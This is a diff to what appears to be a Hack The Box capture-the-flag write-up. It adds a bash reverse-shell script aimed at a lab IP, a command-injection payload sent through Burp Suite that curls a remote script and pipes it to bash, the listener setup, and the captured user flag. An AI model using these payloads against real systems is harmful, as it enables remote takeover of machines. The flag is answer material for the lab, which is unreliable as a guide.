@@ -213,10 +213,47 @@ and still execute the code but not alert.
 > bash reverse shell
 
 ```txt
+#!/bin/bash
+bash -c 'bash -i >& /dev/tcp/10.10.14.64/4444 0>&1'
+```
 
+#### TODO:
+
+```
+1. Set a python server at port 1337, so the webserver can access the bash file from there.
+2. Set a listener at port 4444 so if a shell is spawned, it catch the shell.
+```
+
+> In burpsuite
+
+```txt
+;curl http://10.10.14.64:1337/revshell.sh|bash
 ```
 
 
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e7c1fbf5-0b9b-4912-b56e-a3189dd44749)
+
+
+> RESULT In linux
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/337b9635-1ead-4ee1-a602-5dcecd24e0c6)
+
+
+22. Awesome! We got shell!
+23. Note, the shell is kinda unstable, execute the burp request again to get shell or you can move the `id_rsa` public key to your local machine at `/etc/.ssh`.
+
+> GETTING USER FLAG
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/5302b20f-c6af-46d6-85ac-910b2f777e08)
+
+
+## USER FLAG
+
+```
+b90b25bedc092bb16c78e147cc91e976
+```
+
+> GETTING ROOT FLAG
 
 
  
